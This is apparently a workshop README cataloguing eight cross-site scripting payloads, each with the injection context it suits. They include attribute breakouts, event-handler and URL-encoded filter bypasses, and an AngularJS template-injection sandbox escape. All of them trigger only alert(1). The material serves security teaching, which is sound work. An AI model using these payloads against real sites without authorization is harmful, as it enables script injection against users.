# XSS-Demo: STEM Workshop Edition

A collection of Cross-Site Scripting (XSS) cases and payloads demonstrated during my STEM workshop. This repository serves as a practical guide for understanding how different injection vulnerabilities manifest in various environments.

---

## 🛠️ Exploit Cases

### Case 1: Simple XSS
**Payload:** `<script>alert(1)</script>`  
Used when input is reflected directly into the HTML body.

### Case 2: JavaScript Injection
**Payload:** `"-alert(1)-"`  
Used when the input is reflected inside an existing JavaScript string variable.

### Case 3: XSS Inside HTML Attribute
**Payload:** `"><script>alert(1)</script>`  
Used to break out of an attribute (like `value` or `href`) and start a new script tag.

### Case 4: Attribute Injection (Bypassing `strip_tags`)
**Payload:** `" onmouseover="alert(1)`  
When `<script>` tags are filtered, we use event handlers to execute code.

### Case 5: Bypassing Tag Matching (URL Encoding)
**Payload:** `%22%3E%3Cscript%3Ealert%281%29%3C%2fscript%3E`  
Bypasses basic WAFs or filters that look for literal brackets.

### Case 6: Simple DOM-XSS
**Payload:** `<script>alert(1)</script>`  
Targeting client-side sinks like `innerHTML` or `document.write`.

### Case 7: Client-Side Template Injection (AngularJS)
**Payload:** `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`  
Exploiting the way Angular evaluates expressions within double curly braces.  
*Reference: [PortSwigger AngularJS Research](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)*

### Case 8: JavaScript Escape
**Payload:** `\"-alert(1)//`  
Used to escape from a JSON object or a string where quotes are being escaped.

---

## ⚠️ Disclaimer

**This repository is for educational and research purposes only.** The content is designed to help developers and security researchers understand and defend against XSS attacks. The owner of this repository assumes no responsibility for any misuse, damage, or illegal activities carried out with this information. Always obtain explicit permission before testing on any system you do not own.
